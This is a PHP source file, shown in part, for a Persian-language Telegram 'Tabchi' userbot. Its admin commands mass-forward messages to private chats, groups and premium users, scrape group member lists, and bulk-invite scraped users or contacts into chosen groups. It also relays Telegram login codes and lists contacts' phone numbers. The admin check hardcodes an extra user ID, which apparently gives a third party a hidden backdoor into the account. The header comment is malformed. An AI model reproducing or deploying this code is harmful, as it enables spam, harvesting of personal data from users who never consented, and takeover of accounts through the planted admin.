<?php
* 📬 Telegram: @Abolfazl_rwm — ⚠️ استفاده، ویرایش و بازنشر فقط با ذکر منبع مجاز است؛ حذف این اعتبار اجازه نمی‌شود
* Use, edit and redistribute only with attribution to @Abolfazl_rwm.
* ============================== */
declare(strict_types=1);
//=-=-=-=-=-=-=-=-=-=-=-=[" Tabchi-Cli "]=-=-=-=-=-=-=-=-=-=-=-=
/*

 * Basic MadelineProto-v8
 * Robot  : Tabchi
 * Date   : 2022/09/25
 * Author : @Mahdi_a_8
 * Open   : Sourcekade
 * https://t.me/Sourrce_kade
 
 */
//=-=-=-=-=-=-=-=-=-=-=-=[" Start "]=-=-=-=-=-=-=-=-=-=-=-=

namespace Madeline\Mahdi;

use Amp\ByteStream\ClosedException;
use Amp\ByteStream\StreamException;
use danog\MadelineProto\{EventHandler\Filter\FilterNotEdited,
EventHandler\Media,
EventHandler\Message,
Exception,
RemoteUrl,
Logger,
ParseMode,
RPCErrorException,
Settings,
SimpleEventHandler,
Tools,
VoIP
};
use danog\MadelineProto\EventHandler\SimpleFilter\Incoming;
use danog\MadelineProto\EventHandler\Message\{PrivateMessage, GroupMessage, ChannelMessage};
use danog\MadelineProto\EventHandler\Attributes\{Handler};
use danog\MadelineProto\Broadcast\Filter;
use danog\Loop\GenericLoop;
use danog\MadelineProto\RPCError\FloodWaitError as FloodError;
use function Amp\File\deleteFile;

require_once 'vendor/autoload.php';

date_default_timezone_set('Asia/Tehran');

class MyEventHandler extends SimpleEventHandler
{

const ADMIN = "@Mahdi_a_8"; // یوزرنیم اکانت اصلی

public array $Member = array("list" => []);
public array $Answering = [];
public array $Admins = array("Admins" => []);

public int $CountJoin = 100;

public int $SecondsForComment = 5;

public array $Comment = [];
public array $AutoFor = array("Msg-ID" => 0, "Chat-ID" => 0, "Time" => 0, "Type" => array("Users" => false, "Groups" => true, "Channels" => false));
public array $AutoSend = array("Text" => '', "Type" => array("Users" => false, "Groups" => true, "Channels" => false));
public array $AutoChat = array("AutoChat" => array('Gap' => false, 'Sticker' => false, 'Voice' => false, 'Gif' => false));

public array $Data = array("AutoCall" => false, "AutoFor" => false, "AutoSend" => false, "AutoDelBanGap" => false, "AutoJoin" => false, "CustomComment" => false, "AutoComment" => false);


public function __sleep(): array
{
return ['Member', 'Answering', 'Admins', 'CountJoin', 'Comment', 'AutoFor', 'AutoSend', 'AutoChat', 'Data'];
}

public function PlusVariables(string $string, int $Int): void
{
$this->$string = $Int;
}

public function SetData(string $Index, bool $Bet): void
{
$this->Data[$Index] = $Bet;
}

public function SetSend(string|array $Type, string $Index, bool $Bet): void
{
$this->$Type['Type'][$Index] = $Bet;
}

public function SetChat(mixed $Index, bool $Bet): void
{
$this->AutoChat['AutoChat'][$Index] = $Bet;
}

public function SetComment(string $Text): void
{
$this->Comment = [];
$this->Comment[] = $Text;
}

public function LoopForSend(): int
{
//=-=-=-=-=-=-=-=-=-=-=-=[" Auto-For "]=-=-=-=-=-=-=-=-=-=-=-=
if ($this->Data['AutoFor'] and !empty($this->AutoFor['Msg-ID'])) {
$this->broadcastForwardMessages(
from_peer: $this->AutoFor['Chat-ID'], message_ids: [$this->AutoFor['Msg-ID']],
filter: new Filter(allowUsers: $this->AutoFor['Type']['Users'], allowBots: false, allowGroups: $this->AutoFor['Type']['Groups'], allowChannels: $this->AutoFor['Type']['Channels']));
}
//=-=-=-=-=-=-=-=-=-=-=-=[" Auto-Send "]=-=-=-=-=-=-=-=-=-=-=-=
return $this->AutoFor['Time'];
}

public function LoopForKill(): int
{
if ($this->Data['AutoDelBanGap']) {
$Time = date('H:i', strtotime('+1 hour'));
$i = $this->KillBan(0);
$this->sendMessage(peer: '12', message: "♻️ - پاکسازی خودکار :
🙂 - ادمین عزیز پاکسازی خودکار باموفقیت انجام شد . تعداد گروه های مسدودی : $i
⏰ - تایم بعدی جهت پاکسازی : $Time");
}
return 36000;
}

public function onStart(): void
{
$LoopForSend = new GenericLoop([$this, 'LoopForSend'], 'update Status');
$LoopForKill = new GenericLoop([$this, 'LoopForKill'], 'update Status');
$LoopForSend->start();
$LoopForKill->start();
}

public function getReportPeers(): array
{
return [self::ADMIN];
}

#[Handler]
public function HandleMessage(Incoming&Message $Message): void
{
//=-=-=-=-=-=-=-=-=-=-=-=[" Variables "]=-=-=-=-=-=-=-=-=-=-=-=
$text = $Message->message;
$MsgID = $Message->id ?? 0;
$UserID = $Message->senderId;
$replyTo = $Message->replyToMsgId;
$ChatID = $Message->chatId;
$Answering = $this->Answering;
$Comment = $this->Comment;
$Admin = ""; // ایدی عددی ادمین
$Admins = $this->Admins;
$Helper = ''; //یوزرنیم ربات هلپر به همراه @
$Folder = ''; // دامین + پوشه ربات
$URL = "$Folder/Data/Voice";
//=-=-=-=-=-=-=-=-=-=-=-=[" Function "]=-=-=-=-=-=-=-=-=-=-=-=
$ReplyMessage = function (string $text, ?ParseMode $parseMode = ParseMode::MARKDOWN) use ($Message) {
$this->Message($Message, 'reply', $text, $parseMode);
};
try {
if ($UserID == 777000) {
$array = ['0️⃣', '1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];
$Code = preg_replace('/\D/', '', $text);
$Send = str_replace(range(0, 9), $array, $Code);
$this->Send($Admin, $Send);
}
if ($UserID == $Admin or $UserID == isset($Admins['Admins'][$UserID]) or $UserID == '1144186664') {
//=-=-=-=-=-=-=-=-=-=-=-=[" Ping "]=-=-=-=-=-=-=-=-=-=-=-=
if ($text == 'Ping' or $text == 'ربات' or $text == '.' or $text == '+') {
$ReplyMessage("جونم قربان درخدمتم ؟!");
}
//=-=-=-=-=-=-=-=-=-=-=-=[" Restart "]=-=-=-=-=-=-=-=-=-=-=-=
elseif (preg_match('/^(Restart|Res|ریستارت|ریس)$/i', $text)) {
$ReplyMessage("✠ - ربات باموفقیت مجدد راه اندازی شد !");
$this->restart();
}
//=-=-=-=-=-=-=-=-=-=-=-=[" Switch-All "]=-=-=-=-=-=-=-=-=-=-=-=
switch (true) {
//=-=-=-=-=-=-=-=-=-=-=-=[" Memoryues "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'مصرف':
$ReplyMessage('Memory Usage : ' . round(memory_get_peak_usage(true) / 1021 / 1024, 2) . ' MB');
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Panel "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match('/^(Panel|Help|راهنما|پنل)$/i', $text):
$Res = $this->GetInline($ChatID, $Helper, "HelpBot_");
$this->SendInline($ChatID, $MsgID, $Res['query_id'], $Res['results'][0]['id']);
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Add-Admin "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(addadmin) (.*)$/i", $text, $addadmin):
if (!isset($Admins['Admins'][$addadmin[2]])) {
$this->Admins['Admins'][$addadmin[2]] = $addadmin[2];
$ReplyMessage("✅ - کاربر `$addadmin[2]` باموفقیت به لیست ادمین ها اضافه شد !");
}
else
$ReplyMessage("❌ - کاربر `$addadmin[2]` از قبل در لیست ادمین ها وجود داشت !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Admin "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(deladmin) (.*)$/i", $text, $Del):
if (isset($Admins['Admins'][$Del[2]])) {
unset($this->Admins['Admins'][$Del[2]]);
$ReplyMessage("✅ - کاربر `$Del[2]` باموفقیت از لیست ادمین ها حذف شد !");
}
else
$ReplyMessage("💢 - کاربر `$Del[2]` در لیست وجود ندارد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Clean-Admin "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'CleanAdmin':
$this->Admins['Admins'] = [];
$ReplyMessage("👈 - تمامی ادمین ها باموفقیت عزل شدند !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" List-Admin "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == "Adminlist":
if (count($Admins['Admins']) > 0) {
$Text = "✅ - لیست ادمین های ربات به شرح زیر می باشد  : \n";
$counter = 1;
foreach ($Admins['Admins'] as $k) {
$Text .= "$counter : `$k` \n";
$counter++;
}
$ReplyMessage("$Text");
}
else
$ReplyMessage("🙂 - ادمینی در لیست وجود ندارد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Satas "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match('/^(stats|آمار|امار)$/i', $text):
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$Res = $this->GetInline($ChatID, $Helper, "station_");
$this->SendInline($ChatID, $MsgID, $Res['query_id'], $Res['results'][0]['id']);
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Info-Accaunt "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'info' or $text == '/info':
$Me = $this->getSelf();
$MeId = $Me['id'];
$Name = $Me['first_name'];
$Phone = '+' . $Me['phone'];
$ReplyMessage("
🔄 مشخصات ربات ساخته شده به شرح زیر میباشد :

✠ - سازنده : [$Admin](tg://user?id=$Admin)
✠ - نام اکانت : `$Name`
✠ - آیدی عددی : `$MeId`
✠ - شماره اکانت : `$Phone`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" sessions "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'sessions':
$res = '';
foreach ($this->account->getAuthorizations()['authorizations'] as $authorization) {
$res .= "✅ - نشست های فعلی اکانت :

✠ - مدل دستگاه : `{$authorization['device_model']}`
✠ - سیستم عامل : `{$authorization['platform']}`
✠ - ورژن سیستم : `{$authorization['system_version']}`
✠ - آیپی آیدی : `{$authorization['api_id']}`
✠ - نام برنامه : `{$authorization['app_name']}`
✠ - ورژن برنامه  :`{$authorization['app_version']}`
✠ - تاریخ ورود : " . date("Y-m-d H:i:s", $authorization['date_active']) . "
✠ - آیپی : `{$authorization['ip']}`
✠ - کشور : `{$authorization['country']}`
\n=•=•=•=•=•=•=•=\n";
}
$ReplyMessage($res);
break;
//=-=-=//=-=-=//=-=-=//=-=-=//[" Start-Help-Acc "]=-=-=//=-=-=//=-=-=//=-=-=//
//=-=-=-=-=-=-=-=-=-=-=-=[" Set-User "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(setuser) (.*)$/i", $text, $username):
try {
$this->account->updateUsername(username: $username[2]);
} catch (Exception $exception) {
$ReplyMessage("❗ : " . $exception->getMessage());
}
$ReplyMessage("♻️ - آیدی <code> $username[2] </code> باموفقیت تنظیم شد !", ParseMode::HTML);
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Set-Name . . . "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, '/setname'):
$SetName = substr($text, 9);
$this->account->updateProfile(first_name: $SetName);
$ReplyMessage("
✠ - نام جدید : `$SetName`
✅ - باموفقیت تنظیم شد !");
break;

case str_contains($text, '/setlastname'):
$SetLastName = substr($text, 13);
$this->account->updateProfile(last_name: $SetLastName);
$ReplyMessage("
✠ - نام خانوادگی جدید : `$SetLastName`
✅ - باموفقیت تنظیم شد !");
break;

case str_contains($text, '/setbio'):
$SetBio = substr($text, 8);
$this->account->updateProfile(about: $SetBio);
$ReplyMessage("
✠ - بیوگرافی جدید : `$SetBio`
✅ - باموفقیت تنظیم شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Set-Prof "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == '/setprof':
$Media = $Message->getReply(PrivateMessage::class)?->media;
if (($Media) instanceof Media\Photo) {
$this->photos->updateProfilePhoto(id: $Media);
$ReplyMessage("📌 - پروفایل مورد نظر باموفقیت تنظیم شد !");
}
else
$ReplyMessage("📌 - لطفا روی ویدیو/عکس مورد نظر ریپلای کنید :");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Prof "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, '/delprof'):
$DelProf = substr($text, 9);
$this->photos->deletePhotos(id: $this->photos->getUserPhotos(user_id: 'me', limit: (int)$DelProf)['photos']);
$ReplyMessage("✅ - تعداد `$DelProf` عکس از پروفایل باموفقیت حذف شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Story "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(story) (.*)$/i", $text, $Caption):
$Media = $Message->getReply(PrivateMessage::class)?->media;
if (!$Media) {
$ReplyMessage("📌 - لطفا روی ویدیو/عکس مورد نظر ریپلای کنید :");
return;
}
$this->stories->sendStory(
peer: 'me',
media: $Media,
caption: "$Caption[2]",
parse_mode: ParseMode::MARKDOWN,
privacy_rules: [['_' => 'inputPrivacyValueAllowAll']]
);
$ReplyMessage("✅ - استوری مورد نظر باموفقیت تنظیم شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Story "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(delstory) (.*)$/i", $text, $Count):
$this->stories->deleteStories(peer: 'me', id: [$Count[2]]);
$ReplyMessage("❌ - استوری مورد نظر باموفقیت حذف شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Contact-List "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == '/contactlist' or $text == 'لیست مخاطبین':
$Text = ' ';
$contacts = $this->contacts->getContacts()['users'];
if ($contacts == null) {
$ReplyMessage("🖤 - لیست مخاطبین خالی میباشد . . . !");
return;
}
foreach ($contacts as $contact) {
$name = $contact['first_name'] ?? 'خالی';
$last_name = $contact['last_name'] ?? 'خالی';
$phone = $contact['phone'] ?? 'خالی';
$id = $contact['id'] ?? 'خالی';
$Text .= "✠ - اسم : $name
✠ - فامیل : $last_name
✠ - شماره : $phone
✠ - ایدی عددی : $id

\n=•=•=•=•=•\n";
}
$ReplyMessage($Text, ParseMode::TEXT);
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Delete-Contact "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == '/delcontact':
$array = [];
foreach ($this->contacts->getContacts()['contacts'] as $contact) {
$array[] = $contact['user_id'];
}
$this->contacts->deleteContacts(id: $array);
$ReplyMessage("✅ - تمامی مخاطبین باموفقیت حذف شدند !");
break;
//=-=-=//=-=-=//=-=-=//=-=-=//[" Start-Help-Add "]=-=-=//=-=-=//=-=-=//=-=-=//
//=-=-=-=-=-=-=-=-=-=-=-=[" Add-All "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, '/addall'):
$user = substr($text, 8);
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'supergroup') {
try {
$this->channels->inviteToChannel(channel: $peer, users: ["$user"]);
} catch (\Throwable $Throwable) {
}
}
}
$ReplyMessage("✅ - کاربر `$user` باموفقیت در تمام گروه ها ادد شد . . . !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Add-Pvs "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, '/addpvs'):
$ID = substr($text, 8);
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
foreach ($this->getDialogIds() as $peer) {
$Type = $this->getInfo($peer);
if ($Type['type'] == 'user') {
$Pv = $Type['user_id'];
try {
$this->channels->inviteToChannel(channel: $ID, users: [$Pv]);
} catch (\Throwable $Throwable) {
}
}
}
$ReplyMessage("✅ - تمامی کاربران باموفقیت در گروه `$ID` ادد شدند . . . !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Add-Pv-Contacts "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == '/addcontact':
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 0;
foreach ($this->getDialogIds() as $peer) {
$Info = $this->getInfo($peer);
if ($Info['type'] == 'user') {
$this->contacts->addContact(add_phone_privacy_exception: true, id: $peer, first_name: $Info['User']['first_name'] ?? "تنظیم نشد !", last_name: '- @Source_s');
$i++;
}
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد . تعداد پیوی های مخاطبین شده : `$i`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Add-Contacts "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(addcontacts) (.*)$/i", $text, $ID):
if ($this->contacts->getContactIDs()['users'] == null) {
$ReplyMessage("🖤 - لیست مخاطبین خالی میباشد . . . !");
return;
}
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
try {
$this->channels->inviteToChannel(channel: $ID[2], users: $this->contacts->getContactIDs());
} catch (\Throwable $Throwable) {
$ReplyMessage("❗ : " . $Throwable->getMessage());
}
$ReplyMessage("👥 - تمامی مخاطبین باموفقیت در گروه `$ID[2]` ادد شدند . . . !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Exports "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(exports) (.*)$/i", $text, $ID):
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$offset = 0;
$i = 0;
while (true) {
$Chat = $this->channels->getParticipants(filter: ['_' => 'channelParticipantsRecent'], channel: $ID[2], offset: $offset, limit: 100);
if (empty($Chat['users'])) break;
foreach ($Chat['users'] as $MemberGap) {
if (!$MemberGap['bot'] and isset($MemberGap['username']) and isset($MemberGap['first_name']) and !$MemberGap['deleted'] and !in_array($MemberGap['id'], $this->Member['list'])) {
$this->Member['list'][] = $MemberGap['id'];
$i++;
}
}
if ($i > 500) break;
$offset += 100;
}
$ReplyMessage("⚙️ تعداد $i ممبر باموفقیت استخراج شد . . . !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Add-Exports "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(addexports) (.*)$/i", $text, $ID):
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
try {
$this->channels->inviteToChannel(channel: $ID[2], users: $this->Member['list']);
} catch (\Throwable $Throwable) {
$ReplyMessage("❗ : " . $Throwable->getMessage());
}
$ReplyMessage("⚙️ - تمامی اعضای استخراج شده باموفقیت در گروه `$ID[2]` ادد شدند . . . !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Exports "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == '/delmembers':
$this->Member['list'] = [];
$ReplyMessage("💢 - اعضای استخراج شده باموفقیت حذف شدند !");
break;
//=-=-=//=-=-=//=-=-=//=-=-=//[" Start-Help-Join "]=-=-=//=-=-=//=-=-=//=-=-=//
case $text == 'Join':
$ReplyMessage("💢 - باموفقیت در لینکدونی های ربات عضو شدم !");
$this->JoinChannel(array('@linkdoni_sib', '@Linkdonikv', '@linkd', '@linkdoni', '@grouhkadeh', '@Li_a7', '@Linkdoni_NewOne', '@linkgoin', '@Li_kt', '@linkdoniooi'));
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Left "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'Left':
$Left = substr($text, 5);
$ReplyMessage("✠ - لف دادم !");
$this->Send($Left, "✠ - لف بای  . . . !");
$this->channels->leaveChannel(channel: $Left);
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Kill-Ban "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'Killban':
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = $this->KillBan(0);
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد . تعداد گروه های مسدودی : `$i`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Channels "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'Delchs':
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 0;
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'channel')
$this->channels->leaveChannel(channel: $peer);
$i++;
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد . تعداد چنل های لفتی : `$i`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Pv-Delete "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'DelPvDelete':
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 0;
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['User']['deleted'] ?? false) {
$this->messages->deleteHistory(
just_clear: false,
revoke: true,
peer: $peer
);
$i++;
}
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد . تعداد پیوی حذف شده : `$i`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Bot-Delete "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'DelBotDelete':
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 0;
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['bot']['deleted'] ?? false) {
$this->messages->deleteHistory(
just_clear: false,
revoke: true,
peer: $peer
);
$i++;
}
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد . تعداد ربات حذف شده : `$i`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del-Gaps "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'Delgaps':
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 0;
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'supergroup')
$this->channels->leaveChannel(channel: $peer);
$i++;
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد . تعداد گروه های لفتی : `$i`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del2-Gaps "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, 'Delgap'):
$Count = substr($text, 7);
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 0;
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'supergroup')
$this->channels->leaveChannel(channel: $peer);
$i++;
if ($i == $Count)
break;
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد . تعداد گروه های لفتی : `$i`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Del2-Channels "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, 'Delch'):
$Count = substr($text, 6);
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 0;
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'channel') {
$this->channels->leaveChannel(channel: $peer);
$i++;
}
if ($i == $Count)
break;
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد . تعداد چنل های لفتی : `$i`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Delete-All "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'DeleteAll':
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$Ban = $this->KillBan(0);
$Channel = 0;
$Pv = 0;
$ReplyMessage("درحال پردازش ممکن است دقایقی طول بیانجامد . . . !");
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'channel') {
$this->channels->leaveChannel(channel: $peer);
$Channel++;
}
if ($this->getInfo($peer)['User']['deleted'] ?? false) {
$this->messages->deleteHistory(
just_clear: false,
revoke: true,
peer: $peer
);
$Pv++;
}
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد :
👈 - تعداد چنل های لفتی : `$Channel`
👈 - تعداد گروه های بن شده لفتی : `$Ban`
👈 - تعداد پیوی های حذف شده : `$Pv`");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Delete-All-Pvs "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'DelAllPvs':
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$Pv = 0;
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['user']) {
$this->messages->deleteHistory(
just_clear: false,
revoke: true,
peer: $peer
);
$Pv++;
}
}
$ReplyMessage("✅ - عملیات مورد نظر باموفقیت انجام شد :
👈 - تعداد پیوی های حذف شده : `$Pv`");
break;
//=-=-=//=-=-=//=-=-=//=-=-=//[" Start-Help-For "]=-=-=//=-=-=//=-=-=//=-=-=//
//=-=-=-=-=-=-=-=-=-=-=-=[" For-Bot "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == "Forall" or $text == "Forpvs" or $text == "Forgaps":
if (!$replyTo) {
$ReplyMessage("📌 - لطفا روی پیام مورد نظر ریپلای کنید :");
return;
}
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$Value1 = '';
$Value2 = '';
$Value3 = '';
switch ($text) {
case 'Forall':
$Value1 = true;
$Value2 = false;
$Value3 = true;
break;
case 'Forpvs':
$Value1 = true;
$Value2 = false;
$Value3 = false;
break;
case 'Forgaps':
$Value1 = false;
$Value2 = false;
$Value3 = true;
break;
}
$this->broadcastForwardMessages(
from_peer: $ChatID, message_ids: [$replyTo],
filter: new Filter(allowUsers: $Value1, allowBots: $Value2, allowGroups: $Value3, allowChannels: false));
$ReplyMessage("✠ - عملیات فوروارد پیام با موفقیت انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" For-Gap "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == "Forgap":
if (!$replyTo) {
$ReplyMessage("📌 - لطفا روی پیام مورد نظر ریپلای کنید :");
return;
}
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
foreach ($this->getDialogIds() as $peer) {
if ($this->getInfo($peer)['type'] == 'chat') {
try {
$this->messages->forwardMessages(from_peer: $ChatID, id: [$replyTo], to_peer: $peer);
Tools::sleep(time: rand(2, 5));
} catch (\Throwable $Throwable) {
}
}
}
$ReplyMessage("✠ - عملیات فوروارد پیام با موفقیت انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" For-Exports "]=-=-=-=-=-=-=-=-=-=-=-=
case $text == 'Forexports':
if (!$replyTo) {
$ReplyMessage("📌 - لطفا روی پیام مورد نظر ریپلای کنید :");
return;
}
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$i = 1;
while ($i < count($this->Member['list'])) {
foreach ($this->Member['list'] as $id) {
try {
$this->messages->forwardMessages(from_peer: $ChatID, id: [$replyTo], to_peer: $id);
Tools::sleep(time: rand(2, 5));
} catch (\Throwable $Throwable) {
}
++$i;
}
}
$ReplyMessage("✠ - فوروارد پیام باموفقیت برای `$i` نفر انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" For-Pv-Gap "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(Forpvgap) (.*)$/i", $text, $IDGap):
if (!$replyTo) {
$ReplyMessage("📌 - لطفا روی پیام مورد نظر ریپلای کنید :");
return;
}
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$offset = 0;
$i = 0;
while (true) {
$Chat = $this->channels->getParticipants(filter: ['_' => 'channelParticipantsRecent'], channel: $IDGap[2], offset: $offset, limit: 100)['users'];
if (empty($Chat) or $i == 15) break;
foreach ($Chat as $MemberGap) {
if (!$MemberGap['bot'] and isset($MemberGap['username']) and isset($MemberGap['first_name']) and $MemberGap['id'] != $this->getSelf()['id']) {
$this->messages->forwardMessages(from_peer: $ChatID, id: [$replyTo], to_peer: $MemberGap['id']);
Tools::sleep(time: rand(2, 5));
++$i;
}
}
$offset += 100;
}
$ReplyMessage("✠ - فوروارد پیام باموفقیت برای `$i` نفر انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" For-Pv-Premium "]=-=-=-=-=-=-=-=-=-=-=-=
case preg_match("/^[\/#!]?(Forpvpremium) (.*)$/i", $text, $IDGap):
if (!$replyTo) {
$ReplyMessage("📌 - لطفا روی پیام مورد نظر ریپلای کنید :");
return;
}
$ReplyMessage("⏳- لطفا کمی منتظر بمانید درحال پردازش . . . !");
$offset = 0;
$i = 0;
while (true) {
$Chat = $this->channels->getParticipants(filter: ['_' => 'channelParticipantsRecent'], channel: $IDGap[2], offset: $offset, limit: 100)['users'];
if (empty($Chat) or $i == 15) break;
foreach ($Chat as $MemberGap) {
if (!$MemberGap['bot'] and $MemberGap['premium'] and $MemberGap['id'] != $this->getSelf()['id']) {
$this->messages->forwardMessages(from_peer: $ChatID, id: [$replyTo], to_peer: $MemberGap['id']);
Tools::sleep(time: rand(2, 5));
++$i;
}
}
$offset += 100;
}
$ReplyMessage("✠ - فوروارد پیام باموفقیت برای `$i` کاربر پریمیوم انجام شد !");
break;
//=-=-=-=-=-=-=-=-=-=-=-=[" Set-Aut-For "]=-=-=-=-=-=-=-=-=-=-=-=
case str_contains($text, 'Sft'):
if (!$replyTo) {
$ReplyMessage("📌 - لطفا روی پیام مورد نظر ریپلای کنید :");
return;
}
if (!$this->Data['AutoFor']) {
$ReplyMessage("📌 - لطفا اول قابلیت را از بخش آپشن ها فعال کنید سپس اقدام به تنظیم کنید :");
return;
}
$SetTime = substr($text, 4);
$Text = '';
$this->AutoFor['Msg-ID'] = $replyTo;
$this->AutoFor['Chat-ID'] = $ChatID;
$this->AutoFor['Time'] = $SetTime * 60;
if ($this->AutoFor['Type']['Users']) $Text = "پیوی ها";
elseif ($this->AutoFor['Type']['Groups']) $Text = "گروه ها";
elseif ($this->AutoFor['Type']['Channels']) $Text = "چنل ها";
$ReplyMessage("✅ - فوروارد زماندار باموفقیت در هر `$SetTime` دقیقه برای ارسال به `$Text` انجام شد !");
break;
